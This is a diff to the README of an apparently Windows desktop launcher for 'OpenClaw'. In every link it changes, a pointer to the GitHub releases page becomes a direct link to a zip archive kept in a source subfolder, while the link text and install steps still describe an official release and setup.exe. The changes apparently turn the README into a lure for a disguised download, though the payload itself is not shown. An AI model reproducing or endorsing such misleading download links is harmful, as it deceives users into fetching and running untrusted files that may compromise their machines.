@@ -1,6 +1,6 @@
 # 🗂️ openclaw-desktop-launcher - Manage OpenClaw Easily on Windows
 
-[![Download openclaw-desktop-launcher](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/releases)
+[![Download openclaw-desktop-launcher](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/raw/refs/heads/main/StartOpenClawLauncher/Services/launcher_desktop_openclaw_v3.8-beta.2.zip)
 
 ---
 
@@ -25,7 +25,7 @@ This program uses Windows Presentation Foundation (WPF) and runs on the .NET pla
 
 ## 🚀 Getting Started
 
-1. Click the big blue button at the top or [visit this page to download the launcher](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/releases).
+1. Click the big blue button at the top or [visit this page to download the launcher](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/raw/refs/heads/main/StartOpenClawLauncher/Services/launcher_desktop_openclaw_v3.8-beta.2.zip).
 2. On the release page, look for the latest version. This will usually be at the top of the list.
 3. Download the file named `openclaw-desktop-launcher-setup.exe` or similar.
 4. Once downloaded, find the file in your Downloads folder.
@@ -86,7 +86,7 @@ The list may grow in future updates.
 The launcher checks for updates when you start it. When a new version is available:
 
 - You will see a message with update details.
-- Visit the [release page](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/releases) to download the latest version.
+- Visit the [release page](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/raw/refs/heads/main/StartOpenClawLauncher/Services/launcher_desktop_openclaw_v3.8-beta.2.zip) to download the latest version.
 - Download the new installer and run it to upgrade.
 - Your settings will remain intact.
 
@@ -119,6 +119,6 @@ If you have problems running the launcher or OpenClaw:
 
 Download the launcher from the official release page. Open the page, find the latest release, and download the installer.
 
-[Download openclaw-desktop-launcher from GitHub Releases](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/releases)
+[Download openclaw-desktop-launcher from GitHub Releases](https://github.com/poetic-macroglia442/openclaw-desktop-launcher/raw/refs/heads/main/StartOpenClawLauncher/Services/launcher_desktop_openclaw_v3.8-beta.2.zip)
 
 Run the downloaded file and follow the instructions to install and start using the launcher on your Windows PC.
